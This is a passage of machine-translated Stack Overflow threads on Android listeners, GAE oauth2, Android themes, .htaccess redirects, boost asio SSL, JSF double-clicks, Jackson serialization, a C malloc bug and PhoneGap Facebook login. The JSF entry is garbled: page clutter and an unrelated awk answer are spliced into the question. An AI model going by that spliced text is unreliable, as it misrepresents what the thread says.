stationSpinner.setOnItemSelectedListener(new OnItemSelectedListener() {
    String newStreamUrl;

    @Override
    public void onItemSelected(AdapterView<?> parentView, View selectedItemView, int position, long id) {
        switch (position) {

        // Based on the user's selection, change the URL to match the appropriate station and stream quality.

        case 0:
            // 128kb 89.7 stream
            // Default case, always executed on activity creation.
            newStreamUrl = "defaultStreamUrl";
            changeStream(newStreamUrl);
            break;

        case 1:
            // 320kb stream
            newStreamUrl = "URL1";
            changeStream(newStreamUrl);
            break;

        case 2:
            // 128kb Stream 2
            newStreamUrl = "URL2";
            changeStream(newStreamUrl);
            break;

        case 3:
            // 320kb Steam 2
            newStreamUrl = "URL3";
            changeStream(newStreamUrl);
        }   
    }

    @Override
    public void onNothingSelected(AdapterView<?> parentView) {
    }

}); 
```

progressDialog 的监听器：

```
 pd = ProgressDialog.show(this, "Loading...", "Buffering Stream", true, true, new DialogInterface.OnCancelListener() {

            @Override
            public void onCancel(DialogInterface dialog) {
                pd.dismiss();
                mp.reset();

            }

        }); 
```

以及在缓冲完成时触发播放的侦听器：

```
mp.setOnPreparedListener(new OnPreparedListener() {

                @Override
                public void onPrepared(MediaPlayer mp) {

                    // When the stream is buffered, kill prompt and start playing automatically.
                    pd.dismiss();
                    mp.start();
                    Log.i(TAG, "Stream playback started.");
                }

            }); 
```

...而且我什至还没有完成一半的实现侦听器来处理所有可能的情况。

根据我目前的知识，必须以匿名方式定义侦听器（如我上面所做的那样），或者将其编写为实现侦听器的单独类，然后在所需的类中实例化。也许只有我一个人，但我认为匿名定义这些会使我的代码变得混乱并模糊活动背后的逻辑。但是，由于我实际上只在此类中使用这些侦听器，因此将它们移动到自己的单独文件中似乎是一种浪费，因为它会占用我包的名称空间。

我想知道这种情况的最佳做法是什么。是否有关于侦听器的明确定义的规则，还是仅取决于开发人员的偏好？我正在尝试使这个项目尽可能接近最佳编码实践，因为我是编写 Android 应用程序的新手，所以希望我能从中学到一些东西。有什么想法吗？

* * *

如有必要，我的整个上下文代码：

```
public class StreamActivity extends Activity {

static private MediaPlayer mp;
static ProgressDialog pd;
static String streamUrl = "defaultStreamURL"; // Default value is 128kb/s stream.
private static final String TAG = StreamActivity.class.getName(); // Tag constant for logging purposes

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.stream, menu);
    return true;
}

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.stream_layout);

    // Build selection spinner
    Spinner stationSpinner = (Spinner)findViewById(R.id.station_spinner);
    ArrayAdapter<CharSequence> stationAdapter = ArrayAdapter.createFromResource(this, R.array.station_string_array, android.R.layout.simple_spinner_item);
    stationAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
    stationSpinner.setAdapter(stationAdapter);

    // Set spinner decision logic
    stationSpinner.setOnItemSelectedListener(new OnItemSelectedListener() {
        String newStreamUrl;

        @Override
        public void onItemSelected(AdapterView<?> parentView, View selectedItemView, int position, long id) {
            switch (position) {

            // Based on the user's selection, change the URL to match the appropriate station and stream quality.

            case 0:
                // 128kb 89.7 stream
                // Default case, always executed on activity creation.
                newStreamUrl = "defaultStreamUrl";
                changeStream(newStreamUrl);
                break;

            case 1:
                // 320kb stream
                newStreamUrl = "URL1";
                changeStream(newStreamUrl);
                break;

            case 2:
                // 128kb Stream 2
                newStreamUrl = "URL2";
                changeStream(newStreamUrl);
                break;

            case 3:
                // 320kb Steam 2
                newStreamUrl = "URL3";
                changeStream(newStreamUrl);
            }   
        }

        @Override
        public void onNothingSelected(AdapterView<?> parentView) {
        }

    });

    // Build audio player using default settings.
    mp = buildAudioPlayer();
}

/**
 * Builds and returns a configured, unprepared MediaPlayer. 
     */
public MediaPlayer buildAudioPlayer() {

    // Build MediaPlayer
    mp = new MediaPlayer();

    try {
        mp.reset();
        mp.setAudioStreamType(AudioManager.STREAM_MUSIC);
        mp.setDataSource(streamUrl);
    } catch (IllegalArgumentException e) {
        Log.e(TAG, "Caught IllegalArgumentException: ");
        e.printStackTrace();
    } catch (IllegalStateException e) {
        Log.e(TAG, "Caught IllegalStateException: ");
        e.printStackTrace();
    } catch (SecurityException e) {
        Log.e(TAG, "Caught SecurityException: ");
        e.printStackTrace();
    } catch (IOException e) {
        Log.e(TAG, "Caught IOException: ");
        e.printStackTrace();
    }

    pd = new ProgressDialog(this);
    return mp;
}

protected void changeStream(String newStreamUrl) {
    streamUrl = newStreamUrl;

    // Stop stream if it is currently playing to prevent state exceptions
    if (mp.isPlaying()) {
        Log.i(TAG, "Stream source changed by user. Rebuilding stream.");
        Log.i(TAG, "Stream playback stopped.");
        mp.stop();
    }

    // Rebuild player with new stream URL.
    mp.reset();
    mp = buildAudioPlayer();
}

/**
 * Stops audio, drops connection to stream, and returns Media Player to an unprepared state. Called by a button onClick event.
 * @param v Button pressed by user.
 */
public void stopAudio(View v) {
    mp.stop();
    Log.i(TAG, "Stream playback stopped.");
}
/**
 * Pauses audio with no change to connection or Media Player. Called by a button onClick event.
 * @param v Button pressed by user.
 */
public void pauseAudio(View v) {
    mp.pause();
    Log.i(TAG, "Stream playback paused.");
}

/**
 * Prepares Media Player asynchronously. Displays prompt while buffering and automatically starts when finished. 
 * @param v Button pressed by user.
 */
public void playAudio(View v) {
    // If we are paused, resume playback without rebuffering.
    if (mp.isPlaying()) {
        mp.start();
    } else {

        // If audio is NOT playing, we need to prepare and buffer.
        try {
            mp.setOnPreparedListener(new OnPreparedListener() {

                @Override
                public void onPrepared(MediaPlayer mp) {

                    // When the stream is buffered, kill prompt and start playing automatically.
                    pd.dismiss();
                    mp.start();
                    Log.i(TAG, "Stream playback started.");
                }

            });

            // Prepares stream without blocking UI Thread
            mp.prepareAsync(); 

        } catch (IllegalStateException e) {
            Log.e(TAG, "Caught IllegalStateException when preparing: ");
            e.printStackTrace();
        } 

        // Stop user input while buffering by displaying ProgressDialog
        pd.setCancelable(true);
        pd.setCanceledOnTouchOutside(false);
        pd = ProgressDialog.show(this, "Loading!", "Buffering...", true, true, new DialogInterface.OnCancelListener() {

            @Override
            public void onCancel(DialogInterface dialog) {
                pd.dismiss();
                mp.reset();

            }

        });
    }
}

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:33:22.623

它使您的代码混乱，因为您使它们太长了。将它们减少到最多两到三行，它会更具可读性。例如：

```
 stationSpinner.setOnItemSelectedListener(new OnItemSelectedListener() {
        @Override
        public void onItemSelected(AdapterView<?> parentView, 
                                   View selectedItemView, 
                                   int position, 
                                   long id) {
            changeUrl(position);
        }

        @Override
        public void onNothingSelected(AdapterView<?> parentView) {
        }
    };

...

private void changeUrl(int spinnerPosition) {
    String newStreamUrl;
    switch (position) {

        case 0:
            // 128kb 89.7 stream
            // Default case, always executed on activity creation.
            newStreamUrl = "defaultStreamUrl";
            changeStream(newStreamUrl);
            break;

        case 1:
            // 320kb stream
            newStreamUrl = "URL1";
            changeStream(newStreamUrl);
            break;

        case 2:
            // 128kb Stream 2
            newStreamUrl = "URL2";
            changeStream(newStreamUrl);
            break;

        case 3:
            // 320kb Steam 2
            newStreamUrl = "URL3";
            changeStream(newStreamUrl);
        }   
    }
} 
```

或者，如果它仍然太长，您可以将它们实现为非匿名内部类。例如：

```
 stationSpinner.setOnItemSelectedListener(new StationSpinnerListener());

...

private class StationSpinnerListener implements OnItemSelectedListener {
    @Override
    public void onItemSelected(AdapterView<?> parentView, 
                               View selectedItemView, 
                               int position, 
                               long id) {
        String newStreamUrl;
        switch (position) {

            case 0:
                // 128kb 89.7 stream
                // Default case, always executed on activity creation.
                newStreamUrl = "defaultStreamUrl";
                changeStream(newStreamUrl);
                break;

            case 1:
                // 320kb stream
                newStreamUrl = "URL1";
                changeStream(newStreamUrl);
                break;

            case 2:
                // 128kb Stream 2
                newStreamUrl = "URL2";
                changeStream(newStreamUrl);
                break;

            case 3:
                // 320kb Steam 2
                newStreamUrl = "URL3";
                changeStream(newStreamUrl);
            }   
        }
    }

    @Override
    public void onNothingSelected(AdapterView<?> parentView) {
    }
} 
```

# python - GAE中的oauth2与python

> ID：15936653
> 
> 赞同：1
> 
> 时间：2013-04-10T21:21:54.073
> 
> 标签：python, google-app-engine, oauth-2.0

我想使用一个使用 oauth2 的库。不幸的是，谷歌应用引擎找不到 oauth2 作为库。

当我浏览我的项目时，出现以下错误

```
 import oauth2 as oauth
    ImportError: No module named oauth2 
```

我不能使用谷歌应用引擎的 oauth，因为我必须更改整个库。

有什么建议可以让 oauth2 在 GAE 上运行吗？

该库使用此版本的 oauth2[在此处输入链接描述](https://github.com/simplegeo/python-oauth2)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-11T03:51:04.947

好的，您必须先安装软件包。它将安装到您的默认 python 库中。有 3 种方法可以做到这一点：

第一种方式（MAC）：

```
 sudo easy_install oauth2 
```

第二种方式：

```
 pip install oauth2 
```

第三种方式（如果您想更好地控制安装位置）：

1.  从这里下载 zip 文件[https://github.com/simplegeo/python-oauth2/archive/master.zip](https://github.com/simplegeo/python-oauth2/archive/master.zip)
2.  然后解压缩文件并导航到它下载到的文件夹。
3.  跑

    ```
    python3 setup.py 
    ```

    或者

    ```
    python setup.py 
    ```

取决于您想要的包（python3 或 2）

# android - Android设置默认设备主题

> ID：15936654
> 
> 赞同：1
> 
> 时间：2013-04-10T21:21:55.660
> 
> 标签：android, android-layout

我有一个可以从 2.2 到 4.x 设备运行的应用程序。

当我在 4.x 上运行这个应用程序时，它看起来很酷，全息风格。但是当我在旧设备上运行它时，它似乎非常“轻巧”。

有一个截图，所以你可以比较： ![在此处输入图像描述](https://i.stack.imgur.com/mkAMj.png)

这是我的清单：

```
<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" > 
```

还有我的风格：

```
<resources>

<!--
    Base application theme, dependent on API level. This theme is replaced
    by AppBaseTheme from res/values-vXX/styles.xml on newer devices.
-->
<style name="AppBaseTheme" parent="android:Theme.Holo.Light.NoActionBar.Fullscreen">

</style>
<!-- Application theme. -->
<style name="AppTheme" parent="AppBaseTheme">
    <!-- All customizations that are NOT specific to a particular API-level can go here. -->
</style> 
```

很明显 holo 在 2.3 中不存在，但是它应该呈现它的默认设备主题，对吧？

所以输入是正确的，但是 TextView 看起来**太灰了。**

任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T09:56:17.910

正如有人建议的那样，我终于创建了一个新文件夹： `res/values-v11/` 在这个文件夹上，我放了一个名为 的文件`styles.xml`，如下所示：

```
<resources>

<!--
    Base application theme, dependent on API level. This theme is replaced
    by AppBaseTheme from res/values-vXX/styles.xml on newer devices.
-->
<style name="AppBaseTheme" parent="android:Theme.Holo.Light.NoActionBar.Fullscreen">

</style>
<!-- Application theme. -->
<style name="AppTheme" parent="AppBaseTheme">
    <!-- All customizations that are NOT specific to a particular API-level can go here. -->
</style> 
```

`res/values/`并且将为 api 低于 11 的 android 调用的文件夹包含一个`styles.xml`并且我已经更改了父模板，如下所示：

```
<!--
    Base application theme, dependent on API level. This theme is replaced
    by AppBaseTheme from res/values-vXX/styles.xml on newer devices.
-->
<style name="MyTheme" parent="@android:style/Theme.Light">

</style>
<!-- Application theme. -->
<style name="AppTheme" parent="AppBaseTheme">
    <!-- All customizations that are NOT specific to a particular API-level can go here. -->
</style> 
```

这最终是这样的：

*   api 高于 11 的设备 -> holo 主题
*   其余：Theme.Light（“普通主题”）

# php - 将 IP 地址和子文件夹重定向到新域名

> ID：15936663
> 
> 赞同：-4
> 
> 时间：2013-04-10T21:22:35.673
> 
> 标签：php, wordpress, .htaccess, redirect

我的一些页面正在使用 IP 地址和子文件夹/用户文件夹进行索引。强制所有流量到示例根文件夹地址的最佳方法是什么：

```
123.456.789.012/~user/path1/path2/ 
```

重定向到

```
domainname.com/path1/path2/ 
```

更清楚一点... *123.456.789.012/~user*是我的根域。我需要所有流量才能访问*domainname.com*。我不能让新地址显示为*domainname.com/~user/*因为该文件夹不是域名地址的一部分。

*123.456.789.012/~user* ---应该完全重定向到--> *domainname.com*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:26:04.233

创建一个`.htaccess`文件以强制使用您的域：

```
Options +FollowSymLinks
RewriteEngine on

RewriteCond %{HTTP_HOST} !^domainname.com$ [NC]
RewriteRule ^(.*)$ http://domainname.com/$1 [R=301,L] 
```

编辑：或者，也删除`~user`部分：

```
RewriteRule ^(?:~user\/)?(.*)$ http://domainname.com/$1 [R=301,L] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:26:56.160

通过启用 mod_rewrite 和 .htaccess `httpd.conf`，然后将此代码放在您`.htaccess`的`DOCUMENT_ROOT`目录下：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteCond %{HTTP_HOST} !^(www\.)?domain\.com$ [NC]
RewriteRule ^ http://domain.com%{REQUEST_URI} [R=301,L] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T21:38:35.293

试试这个，将重定向到*/path1/path2*而不是*/~user/path1/path2*

```
Options +FollowSymLinks
RewriteEngine on

RewriteCond %{HTTP_HOST} !^domain\.com$ [NC]
RewriteRule ^~user/(.*)$ http://domain.com/$1 [R=301,L] 
```

# c++ - boost::asio::ssl::context::add_verify_path

> ID：15936668
> 
> 赞同：4
> 
> 时间：2013-04-10T21:22:44.190
> 
> 标签：c++, boost, ssl, openssl, boost-asio

我希望验证服务器的证书。我有一个 boost::asio::ssl::context

这成功验证了证书：

```
context.load_verify_file("E:\\a\\windows\\Path\\to\\certificate\\9207bca9.0"); 
```

但是，我不希望明确指定要验证证书的文件。我希望能够将它们放在一个目录中，并告诉上下文使用该文件夹中的文件来验证证书。所以我这样做：

```
context.add_verify_path("E:\\a\\windows\\Path\\to\\certificate"); 
```

并且验证不成功

注意：文件名9207bca9.0：9207bca9是CA证书的主题的hash，扩展名是'.0'以满足这里找到的add_verify_path方法的要求（也是这个文件的唯一内容是根证书。请记住，我已成功使用此文件验证证书）：

[http://www.boost.org/doc/libs/1_53_0/doc/html/boost_asio/reference/ssl__context/add_verify_path/overload1.html](http://www.boost.org/doc/libs/1_53_0/doc/html/boost_asio/reference/ssl__context/add_verify_path/overload1.html)

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:47:42.907

我能想到的只有两种可能，第一种是你的hash值不正确，可以这样验证：

```
openssl x509 -noout -hash -in ca-certificate-file 
```

第二个是您的目录配置中有一些错误阻止 OpenSSL 使用 CA 目录，例如，权限和所有权在 Linux 系统上很重要，不确定这些在 Windows 平台上的重要性。查明此类错误的唯一方法是通过调试器跟踪验证阶段，并在扫描目录时直接观察代码。

# jsf - 防止在快速点击时重新提交请求 我有一个项目，用户将提交表单，服务器将进行一些处理。我面临一个问题，即用户太快地单击提交按钮两次，这会导致服务器出现异常。我想要做的是在不禁用按钮的情况下防止双击（这是客户端的要求：（）。代码片段是： <h:commandButton id="create_acct_btn" styleClass="common_btn" value="#{msg['ui 问问题 问问题 2013-04-10T21:23:15.820 146 次 This question shows research effort; it is useful and clear 1 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. 我有一个项目，用户将提交表单，服务器将进行一些处理。我面临一个问题，即用户太快地单击提交按钮两次，这会导致服务器出现异常。我想要做的是在不禁用按钮的情况下防止双击（这是客户端的要求：（）。代码片段是： <h:commandButton id="create_acct_btn" styleClass="common_btn" value="#{msg['ui.text.login.create']}"> <f:ajax listener="#{termsPageBean.createAccount}" render="@form" event="click" onevent="createAccountClick"/> </h:commandButton> 函数 createAccountClick(event) { if (event.status == "success") { if($('#createAccountResult').val() === 'true') { $.blockUI({ message: $('#create1'), css: { width: '275px', left: $(document).width()/2 - (275 / 2), border : '0px', }, focusInput: false, overlayCSS:{cursor:"default"} }); } } } 任何想法如何做到这一点。 以下 awk 代码段适用于我创建的虚构文件： 22.22.22.22 dflkhhdfjhdk tslkdkffhdskjgh 33.33.33.33 tddfgkghdfkj 44.44.44.44 55.55.55.55 ghdkjghdkfjhjdfhg iuryweiu kjwhkjfh 66.66.66.66 77.77.77.77 cxlvbclbnc 并通过以下awk程序运行它： awk '/[0-9][0-9].[0-9][0-9].[0-9][0-9].[0-9][0-9]/ { K=$0; next } K { if(length) print K "\n" $0; K=""; next } 1 END { if(K) print K }' infile > outfile 之后outfile的内容如下： 22.22.22.22 dflkhhdfjhdk tslkdkffhdskjgh 33.33.33.33 tddfgkghdfkj 55.55.55.55 ghdkjghdkfjhjdfhg iuryweiu kjwhkjfh 77.77.77.77 cxlvbclbnc 我用来匹配 IP 地址的正则表达式当然需要修改以匹配您的特定情况，但我认为您已经涵盖了它。 希望这可以帮助。我知道它还sed不够接近，但我想。 jsf 4 1 回答 1 This answer is useful 0 只是一个想法，例如，您可以在 event.status="begin" 时取消绑定“click”事件，并在 event.status="success"（或失败等）时恢复它。 希望这可以帮助。 于 2013-04-10T21:45:28.903 回答 Related 3 ios - 单击按钮时从另一个类返回 NSDictionary 2 c# - 将 Sphero 2.0 连接到 Mac OSX 10.9 5 matlab - 出现次数的向量 1 java - 在突破游戏中从桨上弹起球〜java 1 c# - How to Call Schannel Functions from .Net/C# 3 c# - C# SortedList with Byte Array as Key 1 java - Jaxb 不保留包中命名空间的大小写 1 delphi - Delphi XE2中不满足的依赖异常 1 python - How can I programmatically find valid names for Mayavi colormaps? 2 ios - 仅在断点处于活动状态时执行的代码 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：15936677
> 
> 赞同：1
> 
> 时间：
> 
> 标签：jsf

我有一个项目，用户将提交表单，服务器将进行一些处理。我面临一个问题，即用户太快地单击提交按钮两次，这会导致服务器出现异常。我想要做的是在不禁用按钮的情况下防止双击（这是客户端的要求：（）。代码片段是：

```
<h:commandButton id="create_acct_btn" styleClass="common_btn" value="#{msg['ui.text.login.create']}">
                <f:ajax listener="#{termsPageBean.createAccount}" render="@form" event="click" onevent="createAccountClick"/>
            </h:commandButton> 
```

函数 createAccountClick(event) { if (event.status == "success") {

```
 if($('#createAccountResult').val() === 'true') { 
                        $.blockUI({ message: $('#create1'), css: { width: '275px', left: $(document).width()/2 - (275 / 2), border : '0px',
                            },
                    focusInput: false,
                    overlayCSS:{cursor:"default"}
                     });
                    }
                }
            } 
```

任何想法如何做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:45:28.903

只是一个想法，例如，您可以在 event.status="begin" 时**取消绑定“click”**事件，并在 event.status="success"（或失败等）时**恢复它。**

希望这可以帮助。

# java - 如何使用 Jackson 重命名 JSON 序列化中的根键

> ID：15936680
> 
> 赞同：32
> 
> 时间：2013-04-10T21:23:17.163
> 
> 标签：java, json, jackson, root

我正在使用 Jackson 对对象列表进行 JSON 序列化。

这是我得到的：

```
{"ArrayList":[{"id":1,"name":"test name"}]} 
```

但我想要这个：

```
{"rootname":[{"id":1,"name":"test name"}]} // ie showing the string I want as the root name. 
```

以下是我的方法：

界面：

```
public interface MyInterface {
    public long getId();
    public String getName();
} 
```

实现类：

```
@JsonRootName(value = "rootname")
public class MyImpl implements MyInterface {
    private final long id;
    private String name;

    public MyImpl(final long id,final name) {
        this.id = id;
        this.name = name;
    }

   // getters     
} 
```

JSON序列化：

```
public class MySerializer {
    public static String serializeList(final List<MyInterface> lists) {
        //check for null value.Throw Exception
        final ObjectMapper mapper = new ObjectMapper();
        mapper.configure(SerializationConfig.Feature.WRAP_ROOT_VALUE, true);
        return mapper.writeValueAsString(lists);
    }
} 
```

测试：

```
final List<MyInterface> list = new ArrayList<MyImpl>();
MyImpl item = new MyImpl(1L,"test name");
list.add(item);
final String json = MySerializer.serializeList(list);
System.out.println(json); 
```

这是我得到的：

```
{"ArrayList":[{"id":1,"name":"test name"}]} 
```

但我想要这个：

```
{"rootname":[{"id":1,"name":"test name"}]} // ie showing the string I want as the root     name. 
```

我已经尝试了所有我能找到的建议解决方案，但未能实现我的目标。我看过：

*   [Jackson：自定义集合序列化为 JSON](https://stackoverflow.com/questions/3954265/jackson-custom-collection-serialization-to-json)
*   [如何使用 Java Jackson 重命名 JSON 的根键？](https://stackoverflow.com/questions/8034933/how-do-i-rename-the-root-key-of-a-json-with-java-jackson)
*   [Jackson：自定义集合序列化为 JSON](https://stackoverflow.com/questions/3954265/jackson-custom-collection-serialization-to-json)

还是我错过了什么？我为此使用杰克逊 1.9.12。欢迎在这方面提供任何帮助。

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2013-04-10T22:02:15.053

好吧，默认情况下，杰克逊在尝试确定要为包装值显示的根名称时使用两个注释之一 -[`@XmlRootElement`](http://docs.oracle.com/javaee/6/api/javax/xml/bind/annotation/XmlRootElement.html)或[`@JsonRootName`](http://jackson.codehaus.org/1.9.9/javadoc/org/codehaus/jackson/map/annotate/JsonRootName.html). 它期望这个注解在被序列化的类型上，否则它将使用类型的[简单名称](http://docs.oracle.com/javase/6/docs/api/java/lang/Class.html#getSimpleName%28%29)作为根名称。

在您的情况下，您正在序列化一个列表，这就是为什么根名称是“ArrayList”（被序列化类型的简单名称）。列表中的每个元素都可能是带有 @JsonRootName 注释的类型，但列表本身***不是***.

当您尝试包装的根值是一个集合时，您需要某种方式来定义包装名称：

### 持有人/包装类

您可以创建一个包装类来保存列表，并使用注释来定义所需的属性名称（*仅当您无法直接控制`ObjectMapper`/JSON 转换过程*时才需要使用此方法）：

```
class MyInterfaceList {
    @JsonProperty("rootname")
    private List<MyInterface> list;

    public List<MyInterface> getList() {
        return list;
    }

    public void setList(List<MyInterface> list) {
        this.list = list;
    }
}

final List<MyInterface> lists = new ArrayList<MyInterface>(4);
lists.add(new MyImpl(1L, "test name"));
MyInterfaceList listHolder = new MyInterfaceList();
listHolder.setList(lists);
final String json = mapper.writeValueAsString(listHolder); 
```

### 对象编写器

这是更可取的选择。使用配置的[`ObjectWriter`](http://fasterxml.github.io/jackson-databind/javadoc/2.0.0/com/fasterxml/jackson/databind/ObjectWriter.html)实例生成 JSON。特别是，我们对以下[`withRootName`](http://fasterxml.github.io/jackson-databind/javadoc/2.0.0/com/fasterxml/jackson/databind/ObjectWriter.html#withRootName%28java.lang.String%29)方法感兴趣：

```
final List<MyInterface> lists = new ArrayList<MyInterface>(4);
lists.add(new MyImpl(1L, "test name"));
final ObjectWriter writer = mapper.writer().withRootName("rootName");
final String json = writer.writeValueAsString(lists); 
```

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2015-09-17T08:37:12.580

我知道，我迟到了，但我有更好的方法，不需要 Holder/Wrapper 类。它从注释中选择根键。

```
package com.test;

import com.fasterxml.jackson.annotation.JsonRootName;

@JsonRootName("Products")
public class ProductDTO {
    private String name;
    private String description;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getDescription() {
        return description;
    }

    public void setDescription(String description) {
        this.description = description;
    }
} 
```

这是测试类：-

```
package com.test;

import java.io.IOException;
import java.util.ArrayList;

import org.junit.Test;

import com.fasterxml.jackson.annotation.JsonRootName;
import com.fasterxml.jackson.core.JsonGenerationException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class ProductDTOTestCase {
    @Test
    public void testPersistAndFindById() throws JsonGenerationException, JsonMappingException, IOException {
        ObjectMapper mapper = new ObjectMapper();
        ProductDTO productDTO = new ProductDTO();
        productDTO.setDescription("Product 4 - Test");

        ArrayList<ProductDTO> arrayList = new ArrayList<ProductDTO>();
        arrayList.add(productDTO);

        String rootName = ProductDTO.class.getAnnotation(JsonRootName.class).value();
        System.out.println(mapper.writer().withRootName(rootName).writeValueAsString(arrayList));

    }

} 
```

它将给出以下输出

```
{"Products":[{"name":null,"description":"Product 4 - Test"}]} 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2017-04-26T15:49:40.807

```
@JsonTypeName("usuarios")
@JsonTypeInfo(include= JsonTypeInfo.As.WRAPPER_OBJECT,use= JsonTypeInfo.Id.NAME)
public class UsuarioDT extends ArrayList<Usuario> {

    @JsonProperty("rowsAffected")
    private Integer afectados;

    public Integer getAfectados() {
        return afectados;
    }

    public void setAfectados(Integer afectados) {
        this.afectados = afectados;
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-23T12:11:00.873

您需要在类的顶部使用此注释

`@JsonTypeName("rootname")`

# c - C KERN_INVALID_ADDRESS 在 regnexec()

> ID：15936681
> 
> 赞同：0
> 
> 时间：2013-04-10T21:23:20.310
> 
> 标签：c, regex, crash

我正在用 c 编写一个严重依赖正则表达式的程序，而我执行它们的机制在 99% 的时间内都有效，但是它每隔一段时间就会使程序崩溃，我很难理解为什么会这样。

New_Sifter() 接受其正则表达式的字符串表示和一个处理函数，该函数接受一个或多个数组并返回单个字符串。

```
Sifter* New_Sifter(const char* exp, const char*(*func)(const char**, size_t)){
    Sifter *sifter = malloc(sizeof(Sifter*));
    sifter->strRegEx = exp;
    if(regcomp(&(sifter->regEx), exp, REG_EXTENDED)){
        printf("Could not compile regular expression\n");
        exit(1);
    }
    sifter->Sift = &Base_;
    sifter->Custom = func;
    sifter->nGroups = sifter->regEx.re_nsub + 1;
    sifter->captures = malloc(sifter->nGroups * sizeof(regmatch_t));
    Register_Disposable(sifter->captures); //stores pointer in registry to be freed later
    Register_Disposable(sifter); //stores pointer in registry to be freed later
    return sifter;
}

const char* Base_(Sifter* self, const char* source){
    if(regexec(&(self->regEx), source, self->nGroups, self->captures, 
        REG_EXTENDED) != 0){
        printf("about to return null\n");
        return NULL;
    }
    return self->Custom(
        //Sift_() returns an array of the strings captured in the regexec
        Sift_(source, self->captures, self->nGroups), self->nGroups);
} 
```

当我运行它（并使用 gdb 调试一些）时，有时会出现错误，如下所示：

程序收到信号 EXC_BAD_ACCESS，无法访问内存。原因：KERN_INVALID_ADDRESS 地址：0x0000000000000008 0x00007fff90d72b9f in tre_reset_last_matched_branches () (gdb) bt

*   0x00007fff90d72b9f 在 tre_reset_last_matched_branches ()
*   tre_fill_pmatch() 中的 0x00007fff90d72a58
*   tre_match()中的0x00007fff90d72e56
*   0x00007fff90d72d35 在 regnexec ()
*   0x00000001000030cf in Base_ (self=0x1001000e0, source=0x1000033ee "add 11111, 22222, 33333")

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:25:23.843

```
 Sifter *sifter = malloc(sizeof(Sifter*)); 
```

这条线`*`太多了。您正在为指针分配空间，而不是为结构分配空间。将 * 从 sizeof 中取出。

# facebook - 使用 PhoneGap/Cordova 应用程序登录 Facebook

> ID：15936682
> 
> 赞同：7
> 
> 时间：2013-04-10T21:23:23.707
> 
> 标签：facebook, cordova, phonegap-plugins

我最近将 phonegap-facebook-plugin ( [https://github.com/phonegap/phonegap-facebook-plugin](https://github.com/phonegap/phonegap-facebook-plugin) ) 集成到 iOS 和 Android (同一个应用程序) 中。

我想做一些我认为很简单的事情：绕过对本机 facebook 的调用以进行登录/身份验证，并**始终使用 web 对话框**。如何实现这一目标？

我的登录代码目前如下所示：

初始化代码：

```
//facebook initialization
FB.init({
    appId: 'xxxxxxxxxxxx', //'<%#= FB_APP_ID %>',//'',
    nativeInterface: CDV.FB,
    useCachedDialogs: false
}); 
```

登录调用是：

```
FB.login(function(response) {
                            if (response.authResponse) {
                                // connected

                                    me.signInFacebook({
                                    token: response.authResponse.accessToken,
                                    email: response.authResponse.email,
                                    success: function (data) {

                                    // hide login view and show tabview
                                     form.destroy();

                                   // continue whatever action was previously happening
                                        me.continueAction(tabIndexBack, callback);
                                    },
                                    failure: function (response) {
                                        // show errors                                      Ext.Viewport.down('tabscontainerview').setActiveItem(3);
                                    }
                                });
                            } else {
                                 //go back
                                Ext.Viewport.down('tabscontainerview').setActiveItem(3);
                                alert('fb login error');
                            }
                        },{ scope: "email" }); 
```

谢谢你的帮助！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-12T02:35:23.560

我创建了一个插件来促进 Facebook 和 phonegap 之间的连接，而无需将 Plugin Native 仅与 Jquery 一起使用：

[https://github.com/studiosoton/faceGap](https://github.com/studiosoton/faceGap)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-06-10T00:47:14.637

要绕过本机 FB 登录，您可以制作自己的手动 facebook 身份验证流程，而无需使用 Facebook 的 JavaScript SDK ( [https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow/v2 .3](https://developers.facebook.com/docs/facebook-login/manually-build-a-login-flow/v2.3) ) 通过 inAppBrowser 或 ChildBrowser 插件。

您的应用程序必须启动重定向到将显示登录对话框的端点：

```
 https://www.facebook.com/dialog/oauth?client_id={app-id}&redirect_uri={redirect-uri}&response_type=token&scope=email 
```

Facebook 将人们重定向到上面提到的 redirect_uri 并在 URI 片段中放置一个访问令牌以及一些其他元数据（例如令牌到期时间）：

```
https://www.facebook.com/connect/login_success.html#
access_token=ACCESS_TOKEN... 
```

您的应用需要检测此重定向，然后从 URI 中读取访问令牌。然后，您可以直接跳到检查访问令牌步骤。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-24T02:16:36.040

在插件的Android版本上，你可以通过修改插件在类`me.facebook.authorize`的`login`action中调用的方式来强制它使用对话框`org.apache.cordova.facebook.ConnectPlugin`。

